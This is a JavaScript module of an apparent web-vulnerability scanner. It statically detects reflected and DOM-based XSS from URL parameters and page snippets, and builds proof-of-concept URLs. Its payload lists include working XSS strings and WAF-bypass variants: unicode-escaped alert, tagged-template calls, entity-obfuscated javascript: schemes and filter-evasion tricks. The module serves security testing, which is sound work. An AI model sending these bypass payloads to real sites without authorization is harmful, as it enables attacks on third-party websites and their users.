/**
 * 静态XSS检测器
 * 在AI关闭时提供基于规则的XSS漏洞检测能力
 */

class StaticXssDetector {
    constructor() {
        // 危险的DOM sink
        this.dangerousSinks = [
            'innerHTML', 'outerHTML', 'insertAdjacentHTML',
            'document.write', 'document.writeln',
            'eval', 'setTimeout', 'setInterval',
            'Function', 'execScript'
        ];

        // DOM型XSS的source
        this.domSources = [
            'location.search', 'location.hash', 'location.href',
            'document.URL', 'document.documentURI', 'document.referrer',
            'window.name', 'document.cookie',
            'localStorage', 'sessionStorage'
        ];

        // 危险的HTML属性
        this.dangerousAttributes = [
            'href', 'src', 'action', 'formaction',
            'data', 'poster', 'background'
        ];

        // 危险的事件处理器
        this.eventHandlers = [
            'onerror', 'onload', 'onclick', 'onmouseover',
            'onfocus', 'onblur', 'onchange', 'onsubmit',
            'ontoggle', 'onstart', 'onanimationend'
        ];

        // 高风险参数名
        this.highRiskParamNames = [
            'name', 'message', 'msg', 'call', 'callback', 'redirect',
            'url', 'next', 'return', 'q', 'query', 'search',
            'keyword', 'html', 'content', 'data'
        ];

        // 白名单域名（这些网站通常有良好的XSS防护）
        this.whitelistDomains = [
            'google.com', 'baidu.com', 'bing.com', 'yahoo.com',
            'duckduckgo.com', 'yandex.com', 'sogou.com',
            'github.com', 'stackoverflow.com', 'wikipedia.org',
            'amazon.com', 'taobao.com', 'jd.com', 'tmall.com'
        ];
    }

    /**
     * 主入口：分析扫描数据，返回标准化漏洞结果
     */
    analyze(scanData, pageUrl) {
        const result = {
            vulnerabilities: [],
            summary: '',
            analyzedAt: Date.now(),
            detectionMethod: 'static'
        };

        if (!scanData || !pageUrl) return result;

        // 白名单域名过滤
        if (this.isWhitelistedDomain(pageUrl)) {
            return result;
        }

        // 解析参数
        const params = this.parsePageParams(scanData.pageParamSample || []);
        if (params.length === 0) return result;

        const inlineSnippets = [
            ...(scanData.inlineScriptSnippet || []),
            ...(scanData.inlineScriptSinkSnippet || []),
            ...(scanData.inlineScriptProbeSnippet || [])
        ];

        if (inlineSnippets.length === 0) return result;

        // 执行各类检测
        for (const param of params) {
            // 1. HTML标签注入检测
            const htmlTagVulns = this.detectHtmlTagInjection(param, inlineSnippets, pageUrl);
            result.vulnerabilities.push(...htmlTagVulns);

            // 2. HTML属性注入检测
            const attrVulns = this.detectAttributeInjection(param, inlineSnippets, pageUrl);
            result.vulnerabilities.push(...attrVulns);

            // 只有在参数反射到<script>标签内时，才检测JS字符串注入
            const hasScriptReflection = inlineSnippets.some(s =>
                s.startsWith('INLINE_SCRIPT_SNIPPET') && s.includes(param.value)
            );

            if (hasScriptReflection) {
                // 3. JavaScript字符串注入检测
                const scriptVulns = this.detectScriptStringInjection(param, inlineSnippets, pageUrl);
                result.vulnerabilities.push(...scriptVulns);

                // 4. DOM型XSS检测
                const domVulns = this.detectDomXss(param, inlineSnippets, pageUrl);
                result.vulnerabilities.push(...domVulns);
            }

            // 5. 过滤绕过检测
            const bypassVulns = this.detectFilterBypass(param, inlineSnippets, pageUrl);
            result.vulnerabilities.push(...bypassVulns);
        }

        // 过滤低置信度结果
        result.vulnerabilities = result.vulnerabilities.filter(v => v.confidence >= 0.6);

        // 去重：同一 (类型 + source + sink) 只保留置信度最高的一条，避免同一反射重复上报
        const seen = new Map();
        for (const v of result.vulnerabilities) {
            const k = `${v.type}|${v.source}|${v.sink}`.toLowerCase();
            const prev = seen.get(k);
            if (!prev || (v.confidence || 0) > (prev.confidence || 0)) seen.set(k, v);
        }
        result.vulnerabilities = [...seen.values()];

        // 生成摘要
        if (result.vulnerabilities.length > 0) {
            const highCount = result.vulnerabilities.filter(v => v.severity === 'high').length;
            const mediumCount = result.vulnerabilities.filter(v => v.severity === 'medium').length;
            result.summary = `发现 ${result.vulnerabilities.length} 个反射型XSS漏洞（静态检测）`;
            if (highCount > 0) result.summary += `，其中 ${highCount} 个高危`;
        } else {
            result.summary = '未发现XSS漏洞（静态检测）';
        }

        return result;
    }

    /**
     * 检查是否是白名单域名
     */
    isWhitelistedDomain(url) {
        try {
            const hostname = new URL(url).hostname.toLowerCase();
            return this.whitelistDomains.some(domain =>
                hostname === domain || hostname.endsWith('.' + domain)
            );
        } catch {
            return false;
        }
    }

    /**
     * 检查snippet上下文是否真的存在XSS风险
     */
    isRealXssContext(snippetContext, paramValue) {
        // 1. 检查是否被HTML实体编码（&lt; &gt; &quot;等）
        if (snippetContext.includes('&lt;') || snippetContext.includes('&gt;') ||
            snippetContext.includes('&quot;') || snippetContext.includes('&#')) {
            return false;
        }

        // 2. 检查是否在input/textarea的value属性中（通常是安全的回显）
        if (/<input[^>]*value\s*=\s*["'][^"']*/.test(snippetContext) ||
            /<textarea[^>]*>[^<]*/.test(snippetContext)) {
            // 只有在value属性外部才算XSS
            const valueMatch = snippetContext.match(/value\s*=\s*["']([^"']*)["']/);
            if (valueMatch && valueMatch[1].includes(paramValue)) {
                return false; // 在value属性内，不算XSS
            }
        }

        // 3. 检查是否在注释中
        if (/<!--[^>]*/.test(snippetContext) || /\/\/[^\n]*/.test(snippetContext) ||
            /\/\*[^*]*/.test(snippetContext)) {
            return false;
        }

        // 4. 检查是否在危险上下文中（script标签、事件处理器、javascript:协议）
        const dangerousContexts = [
            /<script[^>]*>/i,
            /\bon\w+\s*=/i,  // onerror=, onclick=等
            /href\s*=\s*["']javascript:/i,
            /src\s*=\s*["']javascript:/i
        ];

        const hasDangerousContext = dangerousContexts.some(pattern =>
            pattern.test(snippetContext)
        );

        // 如果没有危险上下文，需要检查是否参数值本身包含危险标签
        if (!hasDangerousContext) {
            // 参数值必须包含HTML标签或事件处理器才算XSS
            const hasDangerousPayload = /<[a-z]+/i.test(paramValue) ||
                                       /on\w+\s*=/i.test(paramValue) ||
                                       /javascript:/i.test(paramValue);
            return hasDangerousPayload;
        }

        return true;
    }

    /**
     * 解析参数样本
     */
    parsePageParams(pageParamSample) {
        const params = [];
        for (const sample of pageParamSample) {
            if (typeof sample !== 'string') continue;

            // 格式: "PARAM: name=value"
            const match = sample.match(/^PARAM:\s*([^=]+)=(.*)$/);
            if (match) {
                params.push({
                    name: match[1].trim(),
                    value: match[2].trim(),
                    raw: sample
                });
            }
        }
        return params;
    }

    /**
     * 检测HTML标签注入
     */
    detectHtmlTagInjection(param, snippets, pageUrl) {
        const vulns = [];
        const { name, value } = param;

        // 参数值太短，跳过
        if (value.length < 3) return vulns;

        // 检查参数值是否在snippet中反射
        let foundInSnippet = false;
        let foundSink = null;
        let snippetContext = '';
        let isHtmlReflection = false;

        for (const snippet of snippets) {
            if (!snippet.includes(value)) continue;
            foundInSnippet = true;

            // 检查是否是HTML反射（来自body.innerHTML）
            if (snippet.startsWith('HTML_REFLECTION')) {
                isHtmlReflection = true;
                foundSink = 'HTML output';
                const contextMatch = snippet.match(/HTML_REFLECTION \(param: [^)]+\): (.+)/);
                if (contextMatch) {
                    snippetContext = contextMatch[1];
                }

                // 验证是否真的存在XSS风险
                if (!this.isRealXssContext(snippetContext, value)) {
                    return vulns; // 不是真正的XSS，跳过
                }

                break;
            }

            // 检查是否在危险sink附近
            for (const sink of this.dangerousSinks) {
                const sinkPattern = new RegExp(`\\b${this.escapeRegex(sink)}\\s*[=(]`, 'i');
                if (sinkPattern.test(snippet)) {
                    // 检查参数值是否在sink附近（200字符窗口）
                    const valueIndex = snippet.indexOf(value);
                    const sinkMatch = snippet.match(sinkPattern);
                    if (sinkMatch && Math.abs(valueIndex - sinkMatch.index) < 200) {
                        foundSink = sink;
                        snippetContext = this.extractContext(snippet, valueIndex, 100);
                        break;
                    }
                }
            }
            if (foundSink) break;
        }

        if (!foundInSnippet) return vulns;

        // 检查是否被HTML实体编码（降低置信度）
        const isEncoded = snippets.some(s =>
            s.includes('&lt;') || s.includes('&gt;') || s.includes('&quot;')
        );

        // 如果被编码了，直接返回（不是XSS）
        if (isEncoded) return vulns;

        // 检查是否在注释中（降低置信度）
        const inComment = snippets.some(s => {
            const valueIndex = s.indexOf(value);
            if (valueIndex === -1) return false;
            const before = s.substring(0, valueIndex);
            return /\/\/[^\n]*$/.test(before) || /\/\*[^*]*$/.test(before) || /<!--[^>]*$/.test(before);
        });

        // 如果在注释中，直接返回（不是XSS）
        if (inComment) return vulns;

        // 关键去误报：HTML 标签注入需要“真的能注入标签”的证据。
        // 若既不是 HTML 反射(body.innerHTML)、又没命中危险 sink，那参数值只是恰好出现在某段脚本/文本里
        // （例如反射进 JS 字符串），这属于 JS 字符串注入的范畴，不应当作 HTML 标签注入上报。
        // 仅当参数值本身已含 HTML 标签特征时，才认为存在标签注入面。
        if (!isHtmlReflection && !foundSink) {
            const valueHasTag = /<[a-z]/i.test(value);
            if (!valueHasTag) return vulns;
        }

        // 计算置信度
        let confidence = 0.7;
        if (foundSink) confidence += 0.15;
        if (isHtmlReflection) confidence += 0.1; // HTML反射是强证据
        if (this.highRiskParamNames.includes(name.toLowerCase())) confidence += 0.1;
        if (value.length < 5) confidence -= 0.1;

        // 额外验证：如果是HTML反射但没有危险sink，降低置信度
        if (isHtmlReflection && !foundSink) {
            // 检查参数值本身是否包含XSS payload特征
            const hasXssPayload = /<script/i.test(value) ||
                                 /<img[^>]+on\w+=/i.test(value) ||
                                 /javascript:/i.test(value) ||
                                 /<iframe/i.test(value) ||
                                 /<svg[^>]+on\w+=/i.test(value);

            if (!hasXssPayload) {
                confidence -= 0.3; // 没有XSS payload特征，大幅降低置信度
            }
        }

        if (confidence < 0.6) return vulns;

        // 生成POC
        const pocs = this.generatePocUrls(pageUrl, name, [
            '<script>alert(document.domain)</script>',
            '<script>alert(1)</script>',
            '<img src=x onerror=alert(1)>',
            '<svg onload=alert(1)>',
            '<iframe src=javascript:alert(1)>'
        ]);

        vulns.push({
            type: 'Reflected XSS - HTML Tag Injection',
            severity: 'high',
            confidence: Math.min(confidence, 0.95),
            source: `URL parameter: ${name}`,
            sink: foundSink || 'HTML context',
            chain: `URL param "${name}" → ${foundSink || 'HTML output'}`,
            analysis: `参数 "${name}" 的值被反射到页面的${foundSink ? `${foundSink} 操作` : 'HTML上下文'}中，可以注入任意HTML标签和JavaScript代码。${snippetContext ? `\n\n上下文片段：\n${snippetContext}` : ''}`,
            poc: pocs[0],
            pocs: pocs,
            detectionMethod: 'static'
        });

        return vulns;
    }

    /**
     * 检测HTML属性注入
     */
    detectAttributeInjection(param, snippets, pageUrl) {
        const vulns = [];
        const { name, value } = param;

        if (value.length < 3) return vulns;

        for (const snippet of snippets) {
            if (!snippet.includes(value)) continue;

            // 检查是否在危险属性中
            for (const attr of this.dangerousAttributes) {
                // 捕获属性的完整取值：href="....." / href='.....'
                const attrPattern = new RegExp(
                    `\\b${attr}\\s*=\\s*(["'])([^"']*)\\1`,
                    'ig'
                );

                // 关键：只有当参数值处在属性值的“开头”时才可利用（可注入 javascript:/data: 协议头）。
                // 若参数值只是埋在一个更长取值中间（例如 message=www 命中了 href="https://www.tj.10086.cn/..."
                // 里的 "www"），那是子串碰撞，不是真反射，直接跳过，避免海量误报。
                let attrVal = null;
                let m;
                attrPattern.lastIndex = 0;
                while ((m = attrPattern.exec(snippet)) !== null) {
                    const v = m[2];
                    const idx = v.indexOf(value);
                    if (idx === 0) { attrVal = v; break; }   // 参数值是属性值前缀 → 可控 scheme
                }
                if (attrVal === null) continue;

                {
                    let confidence = 0.75;
                    if (attr === 'href' || attr === 'src') confidence += 0.05;
                    if (this.highRiskParamNames.includes(name.toLowerCase())) confidence += 0.1;

                    // 根据属性类型生成 POC：主推一条能打的，附少量 WAF 绕过变体（质量 > 数量）
                    let payloads = [];
                    if (attr === 'href' || attr === 'action' || attr === 'formaction') {
                        payloads = [
                            'javascript:alert(document.domain)',
                            // WAF 绕过：HTML 实体混淆 scheme（&#106; = j），浏览器 HTML 解析后还原
                            '&#106;avascript:alert(document.domain)',
                            // WAF 绕过：拆分 alert，避免关键字匹配
                            'javascript:top[/al/.source+/ert/.source](document.domain)'
                        ];
                    } else if (attr === 'src' || attr === 'data') {
                        payloads = [
                            'data:text/html,<script>alert(document.domain)</script>',
                            'data:text/html;base64,PHNjcmlwdD5hbGVydChkb2N1bWVudC5kb21haW4pPC9zY3JpcHQ+',
                            'javascript:alert(document.domain)'
                        ];
                    } else {
                        payloads = [
                            'javascript:alert(document.domain)',
                            'data:text/html,<script>alert(document.domain)</script>'
                        ];
                    }

                    const pocs = this.generatePocUrls(pageUrl, name, payloads);

                    vulns.push({
                        type: 'Reflected XSS - Attribute Injection',
                        severity: 'high',
                        confidence: Math.min(confidence, 0.95),
                        source: `URL parameter: ${name}`,
                        sink: `${attr} attribute`,
                        chain: `URL param "${name}" → ${attr} attribute`,
                        analysis: `参数 "${name}" 的值位于 ${attr} 属性取值的开头，可控制协议头，注入 javascript: / data: 执行脚本。\n\n检测到的上下文：${attr}="${attrVal}"`,
                        poc: pocs[0],
                        pocs: pocs,
                        detectionMethod: 'static'
                    });

                    // 每个参数只报一条，避免同一反射在多个 snippet 里重复命中
                    return vulns;
                }
            }
        }

        return vulns;
    }

    /**
     * 检测JavaScript字符串注入
     */
    detectScriptStringInjection(param, snippets, pageUrl) {
        const vulns = [];
        const { name, value } = param;

        if (value.length < 3) return vulns;

        // 常见 JS 字面量——到处出现但绝不可能是 XSS
        const jsLiterals = new Set(['true', 'false', 'null', 'undefined', 'nan', 'infinity']);
        if (jsLiterals.has(value.toLowerCase())) return vulns;

        // 纯字母/数字的短标识符（<8 字符）如变量名/键名，命中大概率是误报
        if (/^[a-zA-Z_$][a-zA-Z0-9_$]*$/.test(value) && value.length < 8) return vulns;

        for (const snippet of snippets) {
            if (!snippet.includes(value)) continue;

            // 检查是否在JS字符串字面量中
            // 匹配 "value" 或 'value'，且 value 必须处于可注入位置（靠近字符串结尾）
            const doubleQuotePattern = new RegExp(`"[^"]*${this.escapeRegex(value)}[^"]*"`, 'i');
            const singleQuotePattern = new RegExp(`'[^']*${this.escapeRegex(value)}[^']*'`, 'i');

            let quoteType = null;
            if (doubleQuotePattern.test(snippet)) quoteType = '"';
            else if (singleQuotePattern.test(snippet)) quoteType = "'";

            if (quoteType) {
                // 找到值的实际匹配位置，检查它是否处于字符串的"可跳出"位置
                const quote = quoteType;
                const idx = snippet.indexOf(value);
                if (idx === -1) continue;

                // 检查值后面的首个闭合引号距离——太远说明值埋在字符串中间，无法控制上下文
                const afterSlice = snippet.substring(idx + value.length, idx + value.length + 100);
                const closeIdx = afterSlice.indexOf(quote);
                const distanceToClose = closeIdx === -1 ? 999 : closeIdx;

                // 检查值前面的开引号
                const beforeSlice = snippet.substring(Math.max(0, idx - 50), idx);
                const openIdx = beforeSlice.lastIndexOf(quote);
                const charsBefore = openIdx === -1 ? 999 : beforeSlice.length - openIdx - 1;

                let confidence = 0.7;

                // 如果值两边紧贴引号（"VALUE"），值就是整个字符串内容——强证据
                const valueStartsRightAt = charsBefore === 0;
                const valueEndsRightAt = distanceToClose === 0;

                if (valueStartsRightAt && valueEndsRightAt) {
                    confidence += 0.1; // 值独占字符串，最可靠的注入点
                } else if (distanceToClose > 5) {
                    // 值后面还有 5+ 个字符才闭合——埋在中部，很难利用
                    continue;
                }

                // 检查值是不是在 JSON 键的位置（"key": 这种），是则跳过
                const afterTrim = afterSlice.substring(0, Math.min(distanceToClose + 5, 50)).trim();
                if (afterTrim.startsWith(':')) continue;
                if (this.highRiskParamNames.includes(name.toLowerCase())) confidence += 0.1;

                // 检查是否在赋值语句中
                const assignPattern = new RegExp(
                    `\\b(?:location\\.href|window\\.location|src|href)\\s*=\\s*${quoteType}[^${quoteType}]*${this.escapeRegex(value)}`,
                    'i'
                );
                if (assignPattern.test(snippet)) confidence += 0.1;

                // 生成 WAF 感知的 POC：主推一条能打的突破 payload，附少量兜底（质量 > 数量）
                const payloads = this.buildJsStringPayloads(quoteType);

                const pocs = this.generatePocUrls(pageUrl, name, payloads);

                vulns.push({
                    type: 'Reflected XSS - JavaScript String Injection',
                    severity: 'high',
                    confidence: Math.min(confidence, 0.95),
                    source: `URL parameter: ${name}`,
                    sink: 'JavaScript string literal',
                    chain: `URL param "${name}" → JS string (${quoteType})`,
                    analysis: `参数 "${name}" 的值被反射进内联 <script> 的 JavaScript 字符串字面量（${quoteType === '"' ? '双引号' : '单引号'}）。\n\n主 POC 用 "}...,{// 先闭合“字符串+对象”再重开吞尾——因为此类反射的值通常处在 JS 对象字面量里，若只闭合引号会导致整段脚本语法错误而静默不执行。\n绕 WAF 手法：\\u0061lert 用 unicode 转义混淆关键字，tagged template a\`1\` 免括号调用，避开对 "alert"、"(" 的规则匹配。`,
                    poc: pocs[0],
                    pocs: pocs,
                    detectionMethod: 'static'
                });

                break;
            }
        }

        return vulns;
    }

    /**
     * 检测DOM型XSS
     */
    detectDomXss(param, snippets, pageUrl) {
        const vulns = [];
        const { name, value } = param;

        if (value.length < 3) return vulns;

        for (const snippet of snippets) {
            if (!snippet.includes(value)) continue;

            // 检查是否使用了DOM source
            let foundSource = null;
            for (const source of this.domSources) {
                if (snippet.includes(source)) {
                    foundSource = source;
                    break;
                }
            }

            if (!foundSource) continue;

            // 检查是否流向了危险sink
            let foundSink = null;
            for (const sink of this.dangerousSinks) {
                const sinkPattern = new RegExp(`\\b${this.escapeRegex(sink)}\\s*[=(]`, 'i');
                if (sinkPattern.test(snippet)) {
                    foundSink = sink;
                    break;
                }
            }

            if (!foundSink) continue;

            // 计算置信度
            let confidence = 0.8;
            if (foundSink === 'innerHTML' || foundSink === 'eval') confidence += 0.1;
            if (this.highRiskParamNames.includes(name.toLowerCase())) confidence += 0.05;

            // 根据sink类型生成POC
            let payloads = [];
            if (foundSink === 'innerHTML' || foundSink === 'outerHTML' || foundSink === 'insertAdjacentHTML') {
                payloads = [
                    '<img src=x onerror=alert(document.domain)>',
                    '<img src=x onerror=alert(1)>',
                    '<svg onload=alert(1)>',
                    '<iframe src=javascript:alert(1)>'
                ];
            } else if (foundSink === 'eval' || foundSink === 'Function' || foundSink === 'setTimeout' || foundSink === 'setInterval') {
                payloads = [
                    'alert(document.domain)',
                    'alert(1)',
                    'alert(document.cookie)'
                ];
            } else if (foundSink === 'document.write' || foundSink === 'document.writeln') {
                payloads = [
                    '<script>alert(document.domain)</script>',
                    '<img src=x onerror=alert(1)>'
                ];
            } else {
                payloads = [
                    '<img src=x onerror=alert(1)>',
                    'alert(1)'
                ];
            }

            const pocs = this.generatePocUrls(pageUrl, name, payloads);

            vulns.push({
                type: 'DOM XSS',
                severity: 'high',
                confidence: Math.min(confidence, 0.95),
                source: `DOM source: ${foundSource}`,
                sink: foundSink,
                chain: `${foundSource} → ${foundSink}`,
                analysis: `检测到DOM型XSS漏洞：参数 "${name}" 通过 ${foundSource} 获取，然后流向危险的 ${foundSink} 操作。

DOM型XSS特点：
- 数据流完全在客户端JavaScript中
- 不经过服务器处理
- 难以通过WAF防护

检测到的数据流：
${foundSource} → 用户可控数据 → ${foundSink}`,
                poc: pocs[0],
                pocs: pocs,
                detectionMethod: 'static'
            });
        }

        return vulns;
    }

    /**
     * 检测过滤绕过
     */
    detectFilterBypass(param, snippets, pageUrl) {
        const vulns = [];
        const { name, value } = param;

        // 检查是否有关键字被过滤
        const keywords = ['<script>', 'onerror', 'onload', 'onclick', 'javascript:', 'alert'];
        const filtered = [];

        for (const keyword of keywords) {
            if (value.toLowerCase().includes(keyword.toLowerCase())) {
                // 检查snippet中是否不包含该关键字（说明被过滤）
                const foundInSnippet = snippets.some(s =>
                    s.toLowerCase().includes(keyword.toLowerCase())
                );
                if (!foundInSnippet) {
                    filtered.push(keyword);
                }
            }
        }

        if (filtered.length === 0) return vulns;

        // 生成绕过payload
        const bypassPayloads = [];

        if (filtered.includes('<script>')) {
            bypassPayloads.push(
                '<ScRiPt>alert(1)</ScRiPt>',
                '<scr<script>ipt>alert(1)</scr</script>ipt>',
                '<img src=x onerror=alert(1)>',
                '<svg onload=alert(1)>',
                '<iframe src=javascript:alert(1)>'
            );
        }

        if (filtered.includes('onerror') || filtered.includes('onload')) {
            bypassPayloads.push(
                '<img src=x OnErRoR=alert(1)>',
                '<svg OnLoAd=alert(1)>',
                '<img src=x on&#101;rror=alert(1)>',
                '<img src=x on\u0065rror=alert(1)>',
                '<img src=x onerror=alert(1)>'.replace('onerror', 'on' + String.fromCharCode(101) + 'rror')
            );
        }

        if (filtered.includes('onclick')) {
            bypassPayloads.push(
                '<button OnClIcK=alert(1)>Click</button>',
                '<div on&#99;lick=alert(1)>Click</div>'
            );
        }

        if (filtered.includes('javascript:')) {
            bypassPayloads.push(
                'javas&#99;ript:alert(1)',
                'java\\u0073cript:alert(1)',
                'JaVaScRiPt:alert(1)',
                'data:text/html,<script>alert(1)</script>'
            );
        }

        if (filtered.includes('alert')) {
            bypassPayloads.push(
                '<img src=x onerror=(alert)(1)>',
                '<img src=x onerror=&#97;lert(1)>',
                '<img src=x onerror=confirm(1)>',
                '<img src=x onerror=prompt(1)>'
            );
        }

        if (bypassPayloads.length === 0) return vulns;

        const pocs = this.generatePocUrls(pageUrl, name, bypassPayloads);

        vulns.push({
            type: 'Reflected XSS - Filter Bypass',
            severity: 'high',
            confidence: 0.75,
            source: `URL parameter: ${name}`,
            sink: 'Filtered output',
            chain: `URL param "${name}" → filtered context`,
            analysis: `参数 "${name}" 的值被过滤（检测到关键字过滤：${filtered.join(', ')}），但可能存在绕过方式：

绕过技巧：
1. 大小写混淆：<ScRiPt>, OnErRoR
2. HTML实体编码：&#97;lert, &#x61;lert
3. Unicode转义：\\u0061lert
4. 双写绕过：<scr<script>ipt>
5. 替代标签：使用<img>, <svg>, <iframe>等
6. 替代协议：data:text/html 代替 javascript:

已过滤的关键字：${filtered.join(', ')}`,
            poc: pocs[0],
            pocs: pocs,
            detectionMethod: 'static'
        });

        return vulns;
    }

    /**
     * 构造 JS 字符串注入的 WAF 感知 payload（质量优先，主 POC 放第一条）
     * - alert 用 unicode 转义混淆 "alert" 关键字，绕过基于关键字的 WAF
     * - tagged template `1` 调用，避免出现 "(" 触发 WAF
     * - inObject=true 时先闭合对象（}）再重开（{）吞掉尾部，适配 {k:"..."} 这类上下文
     */
    buildJsStringPayloads(quoteType = '"') {
        const q = quoteType === "'" ? "'" : '"';
        // 【为什么主推“闭合对象”式】反射进内联 <script> 的参数,绝大多数被塞进 JS 对象/数组字面量
        // （形如 {"call":"..","message":"REF",..}）。此时若只用语句式闭合 ";...;//,会让整段 <script>
        // 语法错误 → 浏览器直接放弃执行整段脚本 → 不弹窗(静默失败,看似“打不动”)。
        // 用 "}...,{// 先闭合对象再重开吞尾,才能保证注入后脚本仍语法完整、真正执行。已在真实目标验证可弹窗。
        const list = [
            q + "}a=\\u0061lert,a`1`,{//",   // 主推:闭合对象突破(unicode 混淆 alert + tagged template 免括号,绕 WAF)
            q + ";a=\\u0061lert,a`1`;//",     // 兜底1:普通字符串/顶层语句上下文
            q + "}alert(document.domain)//"   // 兜底2:明文闭合对象,便于人工快速确认反射点
        ];
        return [...new Set(list)];
    }

    /**
     * 生成POC URL列表
     */
    generatePocUrls(baseUrl, paramName, payloads) {
        const pocs = [];

        try {
            const url = new URL(baseUrl);

            for (const payload of payloads) {
                const testUrl = new URL(baseUrl);
                testUrl.searchParams.set(paramName, payload);
                pocs.push(testUrl.toString());
            }
        } catch (e) {
            // URL解析失败，返回空数组
        }

        return pocs;
    }

    /**
     * 提取上下文片段
     */
    extractContext(text, index, radius) {
        const start = Math.max(0, index - radius);
        const end = Math.min(text.length, index + radius);
        let context = text.substring(start, end);

        if (start > 0) context = '...' + context;
        if (end < text.length) context = context + '...';

        return context;
    }

    /**
     * 转义正则表达式特殊字符
     */
    escapeRegex(str) {
        return str.replace(/[.*+?^${}()|[\]\\]/g, '\\$&');
    }
}

// 导出单例
export const staticXssDetector = new StaticXssDetector();
